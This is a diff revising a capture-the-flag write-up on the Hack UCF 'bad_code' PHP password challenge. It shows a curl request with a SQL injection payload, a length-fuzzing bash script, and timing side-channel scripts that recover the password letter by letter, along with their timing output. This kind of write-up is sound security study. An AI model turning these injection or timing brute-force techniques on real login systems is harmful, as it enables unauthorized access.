@@ -56,13 +56,10 @@ WRONG.<br/><br/><br/><small><div class="footer">Response generated in: <time>0.0
 > curl "http://ctf.hackucf.org:4000/bad_code/bad_code.php?passwd=%27+OR+%271%3D1%27%3B+--
 WRONG.<br/><br/><br/><small><div class="footer">Response generated in: <time>0.010131120681763</time></div><small>
 ```
-No results or SQL errors, so we can assume it doesn't use SQL - the website only has a password box and no username, so it using SQL was unlikely.
+No results or SQL errors, so we can assume it doesn't use SQL - the website only has a password box and no username, so the site using SQL was unlikely.
 
-I also tried to pass `0` as the password in case there was some weak type comparison that could be exploited if it compares numbers with strings:
-```
-> curl "http://ctf.hackucf.org:4000/bad_code/bad_code.php?passwd=0"
-WRONG.<br/><br/><br/><small><div class="footer">Response generated in: <time>0.010130167007446</time></div><small>
-```
+> Note: At this point I did spend a lot of time researching and trying various things, but they didn't do anything interesting, so I removed them from this write-up to stop it getting too long!
+
 Next I tried to see what would happen if I sent long passwords to the website - could we break some PHP and get an insight into the code? I wrote a script:
 ```bash
 #!/bin/bash
@@ -71,17 +68,19 @@ url="http://ctf.hackucf.org:4000/bad_code/bad_code.php?passwd="
 echo "Returned strings" > returned_strings.txt
 expected="WRONG.<br/><br/><br/><small><div class=\"footer\">Response generated in: </div><small>"
 
-# Call the url with longer and longer strings - can we get an overflow?
-# Start at 100 as we know it won't be a low number
+# Call the url with longer and longer strings - can we get an overflow in PHP?
 passwd_val=
-
 for i in {1..9000}
 do
   passwd_val=${passwd_val}A
   nxt_url=$url$passwd_val
   echo "Testing with $i letters"
   rep=$(curl -s "$nxt_url" | sed -e "s/<time>.*<\/time>//")
+
+  # Test the diff of the result
   diff_val=$(diff <(echo $expected) <(echo $rep))
+
+  # Check the length of the diff
   if [ ${#diff_val} -ne 0 ]
   then
     echo "Testing $nxt_url" >> returned_strings.txt
@@ -91,7 +90,7 @@ do
   fi 
 done
 ```
-Running this returned empty responses for some values (possibly timeouts), but which returned blank responses changed on each run, so no consistent failure. Also, once the length of the password got to 8149, the server returned an error for all further tests:
+Running this returned empty responses for some values (possibly timeouts), but which lengths returned blank responses changed on each run, so no consistent failure. Also, once the length of the password got to 8149, the server returned an error for all further tests:
 ```
 Number of characters: 8149
 diff was: 1c1
@@ -112,7 +111,7 @@ limit for this server.<br />
 ```
 So we found nothing out through this.
 
-Next I was curious to find out if the time that was printed out in the response page meant anything. If some entry enables us to get deeper into the code, it can take fractions of a second longer the get there, and this may be reflected in the output. I wrote a new script to test this:
+Next I was curious to find out if the time that was printed out in the response page meant anything. If some password value enables us to get deeper into the code, it can take fractions of a second longer to get there, and this may be reflected in the output. I wrote a new script to test this:
 ```bash
 #!/bin/bash
 
@@ -180,11 +179,75 @@ do
   echo "Average time for all characters: $final_avg" >> timing_results.txt
 done
 ``` 
-This script does 10 runs so we can see if there's any consistency. It creates passwords of 1 to 100 characters long, and sends those passwords to the server 20 times to take an average of the length of time taken. For each run, output the one that took longest, the one that took the shortest and the average time.
+This script performs 10 runs so we can see if there's any consistency. It creates passwords of 1 to 100 characters long, and sends those passwords to the server 20 times to take an average of the length of time taken. For each run, I output the one that took longest, the one that took the shortest and the average time.
 
-I ran this, but the results showed that a different length of password was the longest on each of the 10 runs.
+On running this, the results showed that a different length of password took the longest time on each of the 10 runs. As there is no consistent answer, the password makes no difference to the code executed:
+```
+Timing results
+==============
+-------------------
+Run 1
+-------------------
+Longest time was 5 characters: .010355496406555
+Shortest time was 98 characters: .010105156898498
+Average time for all characters: .010123975396155
+-------------------
+Run 2
+-------------------
+Longest time was 86 characters: .010375463962555
+Shortest time was 2 characters: .010103070735931
+Average time for all characters: .010122805118560
+-------------------
+Run 3
+-------------------
+Longest time was 95 characters: .010258483886718
+Shortest time was 62 characters: .010103106498718
+Average time for all characters: .010120621562003
+-------------------
+Run 4
+-------------------
+Longest time was 93 characters: .010487496852874
+Shortest time was 92 characters: .010105454921722
+Average time for all characters: .010136174559592
+-------------------
+Run 5
+-------------------
+Longest time was 38 characters: .010620379447937
+Shortest time was 4 characters: .010103845596313
+Average time for all characters: .010132197022437
+-------------------
+Run 6
+-------------------
+Longest time was 30 characters: .010530638694763
+Shortest time was 31 characters: .010104358196258
+Average time for all characters: .010130006909369
+-------------------
+Run 7
+-------------------
+Longest time was 99 characters: .010369277000427
+Shortest time was 17 characters: .010105109214782
+Average time for all characters: .010126906871795
+-------------------
+Run 8
+-------------------
+Longest time was 64 characters: .010369932651519
+Shortest time was 18 characters: .010104942321777
+Average time for all characters: .010133168220519
+-------------------
+Run 9
+-------------------
+Longest time was 4 characters: .010339975357055
+Shortest time was 76 characters: .010105037689209
+Average time for all characters: .010125115990638
+-------------------
+Run 10
+-------------------
+Longest time was 93 characters: .010330796241760
+Shortest time was 14 characters: .010105884075164
+Average time for all characters: .010123458385467
+```
 
-Another timing to look at may incolve the `str_split()` we saw earlier. If it splits the password into individual letters, we could also use the timing to see if we could find each letter in the password by checking the one that took longest (i.e. moved on to chack the second letter). I created a script to do this:
+Another timing to look at may incolve the `str_split()` we saw earlier. If it splits the password into individual letters, we could also use the outputted time to see if we could find each letter in the password by checking the one that took longest (i.e. moved on to check the second letter, taking slightly longer). I created a script to do this:
 ```bash
 #!/bin/bash
 
@@ -320,11 +383,11 @@ Longest time was for 65 (A): .030266976356506
 Shortest time was for 89 (Y): .010108685493469
 Average time for all characters: .010341890360179
 ```
-This looked promising, so I updated the code to automatically add the letter that took the longest to the `start_of_pass` varaible, and to run until the result of passing `start_of_pass` as `passwd` returned a different result to the "WRONG" page. 
+This looked promising, so I updated the code to automatically add the letter that took the longest to the end of the `start_of_pass` variable. The code now tests if passing `start_of_pass` as `passwd` returned a different result to the "WRONG" page. If so, it assumes we found the password. 
 
-As the results seemed consistent, I also removed the repeating of the tests, both the calls and runs. These were only there incase the difference in times was small to try and handle small errors. The differences are easily noticable, though. 
+As the results seemed consistent, I also removed the repeating of the tests, both the 20 calls and 10 runs. These were only there in case the difference in times was small, so it would try and handle small errors by averaging them out. The differences are easily noticable, though. 
 
-Also I removed some of the information output. The final script was:
+Finally, I removed some of the information output and final script was:
 ```bash
 #!/bin/bash
 
@@ -356,13 +419,14 @@ do
     next_url=$url$passwd
     echo "URL: $next_url"
     nxt_time=$(curl -s "$next_url" | sed -e "s/^.*<time>//" -e "s/<.*$//")
-    # When we try the actual password here, it returns the flag rather than the time,
-    # so bail out!
+    
+    # When we try the actual password here, it returns something other than the time,
+    # so bail out if the answer isn't numeric!
     if [[ $nxt_time =~ ^[0-9.]+$ ]]
     then
       echo "Time: $nxt_time" 
 
-      # Record which was the largest and smallest result
+      # Record which was the largest result
       if (( $(echo "$nxt_time > $large_time" | bc -l) ))
       then
         large_time=$nxt_time
